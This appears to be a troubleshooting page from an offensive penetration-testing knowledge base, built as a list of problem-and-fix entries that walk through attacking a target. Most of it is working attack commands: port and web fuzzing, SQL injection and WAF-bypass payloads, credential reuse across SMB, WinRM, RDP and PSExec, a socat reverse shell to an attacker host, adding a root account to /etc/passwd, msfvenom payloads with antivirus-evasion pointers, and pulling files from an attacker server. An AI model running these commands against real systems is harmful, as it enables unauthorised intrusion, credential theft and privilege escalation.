# Troubleshooting — When Things Go Wrong

> You don't need to be creative. Every problem has been seen before.
> Find your situation below and follow the solution.

---

## 🚫 "I can't find any open ports"

**Causes & Solutions:**
1. **Host is down** → Try: `ping TARGET` — if no response, try `nmap -Pn TARGET` (scan without ping)
2. **Firewall blocking** → Try: `nmap -sS -Pn -p- --min-rate 1000 TARGET` (stealth SYN scan)
3. **Wrong IP** → Double-check the target IP/hostname
4. **UDP services only** → Try: `nmap -sU --top-ports 50 TARGET`
5. **IDS blocking your scans** → Slow down: `nmap -sS -T2 TARGET` (timing template 2 = polite)

---

## 🚫 "Port is open but I don't know what to do with it"

**Solution:** Read `knowledge-base/checklists/enumeration-checklist.md` — find your port number and follow EVERY step listed.

**Quick reference:**
```
Port 21 (FTP)    → Try anonymous login: ftp TARGET → user: anonymous, pass: (empty)
Port 22 (SSH)    → Check version, try default creds, brute force if allowed
Port 25 (SMTP)   → VRFY/EXPN users, check for open relay
Port 53 (DNS)    → Try zone transfer: dig axfr @TARGET domain.com
Port 80/443      → Web attack → read playbooks/web-app-pentest.md
Port 88          → Kerberos → AD attack → read checklists/ad-attack-checklist.md
Port 110/143     → POP3/IMAP → Try default creds
Port 135         → RPC → rpcclient -U "" -N TARGET
Port 139/445     → SMB → enum4linux -a TARGET
Port 161         → SNMP → snmpwalk -v2c -c public TARGET
Port 389/636     → LDAP → ldapsearch -x -H ldap://TARGET -b "" -s base
Port 1433        → MSSQL → Try default sa:sa, or sqsh/impacket-mssqlclient
Port 3306        → MySQL → mysql -h TARGET -u root -p
Port 3389        → RDP → xfreerdp /v:TARGET /u:admin /p:pass
Port 5432        → PostgreSQL → psql -h TARGET -U postgres
Port 5985        → WinRM → evil-winrm -i TARGET -u user -p pass
Port 6379        → Redis → redis-cli -h TARGET
Port 8080/8443   → Web (alternative ports) → same as 80/443
Port 27017       → MongoDB → mongosh --host TARGET
```

---

## 🚫 "Web scan found nothing interesting"

**Try these in order:**
1. **Bigger wordlist:** `ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
2. **Different extensions:** Add `-e php,html,txt,bak,old,conf,xml,json,yml,env,asp,aspx,jsp`
3. **Virtual hosts:** `ffuf -u http://TARGET -H "Host: FUZZ.TARGET" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE`
4. **Check robots.txt:** `curl http://TARGET/robots.txt`
5. **Check source code:** View page source, look for comments, hidden inputs, JS files
6. **Parameter fuzzing:** `arjun -u http://TARGET/endpoint` or `ffuf -u "http://TARGET/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`
7. **Different HTTP methods:** `curl -X PUT http://TARGET/test.txt -d "test"`
8. **Check for APIs:** `ffuf -u http://TARGET/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt`

---

## 🚫 "SQLi isn't working"

**Try these bypasses:**
1. **Different injection points:** Test ALL parameters, headers (User-Agent, Cookie, Referer), POST body
2. **Different payloads:**
   - `' OR 1=1-- -`
   - `" OR 1=1-- -`
   - `' OR '1'='1`
   - `') OR ('1'='1`
   - `1 OR 1=1`
3. **WAF bypass:**
   - URL encode: `%27%20OR%201%3D1--`
   - Double URL encode: `%2527%2520OR%25201%253D1--`
   - Case variation: `' oR 1=1-- -`
   - Comment injection: `'/**/OR/**/1=1-- -`
4. **Blind SQLi:** `' AND SLEEP(5)-- -` (if page delays 5 seconds, it's vulnerable)
5. **Use sqlmap with more aggression:** `sqlmap -u URL --level=5 --risk=3 --batch`
6. **Try different DBMS:** `sqlmap -u URL --dbms=mysql/mssql/postgresql --batch`

---

## 🚫 "I got credentials but can't use them"

**Try EVERY protocol:**
```bash
# SMB
crackmapexec smb TARGET -u USER -p 'PASS'
smbclient //TARGET/SHARENAME -U 'USER%PASS'

# WinRM
crackmapexec winrm TARGET -u USER -p 'PASS'
evil-winrm -i TARGET -u USER -p 'PASS'

# SSH
ssh USER@TARGET
sshpass -p 'PASS' ssh USER@TARGET

# RDP
xfreerdp /v:TARGET /u:USER /p:'PASS' /cert-ignore

# PSExec
impacket-psexec DOMAIN/USER:'PASS'@TARGET

# WMI
impacket-wmiexec DOMAIN/USER:'PASS'@TARGET

# MSSQL
impacket-mssqlclient DOMAIN/USER:'PASS'@TARGET

# LDAP
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' -b "dc=domain,dc=com"
```

**Still not working?**
- Is it a hash not a password? → Use `-H HASH` instead of `-p PASS`
- Wrong domain? → Try without domain, or try `DOMAIN\USER`, `USER@DOMAIN`
- Account locked? → Wait and try later, or try another account
- Password expired? → Try RDP (sometimes allows password change)

---

## 🚫 "I have a shell but it's unstable / dies"

**Stabilize it:**
```bash
# Python PTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 cols 200

# If python isn't available
script /dev/null -c bash
# or
/usr/bin/script -qc /bin/bash /dev/null

# If shell keeps dying, use socat for stable connection
# Attacker: socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
# Target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:ATTACKER:4444
```

---

## 🚫 "Privilege escalation isn't working"

**Check these in order:**
```bash
# 1. Sudo permissions
sudo -l
# If ANYTHING shows up, check GTFOBins: https://gtfobins.github.io/

# 2. SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Check each one on GTFOBins

# 3. Capabilities
getcap -r / 2>/dev/null

# 4. Writable cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# 5. Writable /etc/passwd
ls -la /etc/passwd
# If writable: echo 'root2:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd

# 6. Kernel exploits (last resort)
uname -a
# Search: bash scripts/research.sh "linux kernel VERSION"

# 7. Passwords in files
grep -rn "password\|passwd\|pass=" /var/www/ /home/ /opt/ /etc/ 2>/dev/null | head -20
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name ".env" 2>/dev/null | xargs grep -l "pass" 2>/dev/null

# 8. Internal services running as root
netstat -tulpn 2>/dev/null || ss -tulpn
# If a service runs as root on localhost, exploit it
```

---

## 🚫 "I'm stuck — nothing works"

**Step back and try:**
1. **Re-enumerate** — You probably missed something. Run scans again with different options.
2. **Check ALL ports** — `nmap -p- TARGET` (full 65535 ports)
3. **Check UDP** — `nmap -sU --top-ports 50 TARGET`
4. **Look at the source** — HTML source, JS files, comments
5. **Check other subdomains** — `subfinder -d DOMAIN`
6. **Try default credentials** — Check SecLists: `/usr/share/seclists/Passwords/Default-Credentials/`
7. **Google the service version** — `"ServiceName version" exploit`
8. **Run research script** — `bash scripts/research.sh "service version"`
9. **Check for CVEs** — `nuclei -u http://TARGET -t cves/`
10. **Try password spraying** — `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form...`

**The answer is ALWAYS in the enumeration.** Go back to step 1.

---

## 🚫 "The exploit failed"

**Common reasons & fixes:**
1. **Wrong architecture** → Check: 32-bit or 64-bit? Linux or Windows?
2. **Bad payload** → Regenerate: `msfvenom -p ... LHOST=YOUR_IP LPORT=YOUR_PORT`
3. **Firewall blocking reverse connection** → Try different ports: 80, 443, 53
4. **AV caught it** → Read: `knowledge-base/mitre-attack/techniques/defense-evasion-deep.md`
5. **Exploit needs modification** → Read the exploit code, understand what it does
6. **Target was patched** → Try a different vulnerability
7. **Wrong listener** → Make sure your listener matches the payload type

---

## 🚫 "I can't transfer files to the target"

```bash
# Method 1: Python HTTP server (attacker)
python3 -m http.server 8080
# Target downloads: wget http://ATTACKER:8080/file OR curl http://ATTACKER:8080/file -o file

# Method 2: Netcat
# Attacker: nc -lvnp 9999 < file
# Target: nc ATTACKER 9999 > file

# Method 3: Base64 (no network needed)
# Attacker: base64 file | tr -d '\n'
# Target: echo 'BASE64STRING' | base64 -d > file

# Method 4: SMB (Windows targets)
# Attacker: impacket-smbserver share /path -smb2support
# Target: copy \\ATTACKER\share\file C:\temp\file

# Method 5: SCP (if SSH)
scp file USER@TARGET:/tmp/file
```
